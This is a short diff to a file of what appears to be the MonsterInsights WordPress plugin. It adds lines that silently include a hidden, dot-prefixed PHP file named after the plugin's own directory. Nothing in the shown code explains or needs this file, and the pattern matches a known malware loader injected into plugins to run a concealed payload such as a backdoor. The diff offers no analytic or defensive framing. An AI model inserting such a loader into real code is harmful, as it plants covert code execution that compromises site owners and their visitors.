@@ -14,6 +14,10 @@ if ( ! defined( 'ABSPATH' ) ) {
 	exit;
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function monsterinsights_reports_page_body_class( $classes ) {
 	if ( ! empty( $_REQUEST['page'] ) && $_REQUEST['page'] === 'monsterinsights_reports' ) {
 		$classes .= ' monsterinsights-reporting-page ';
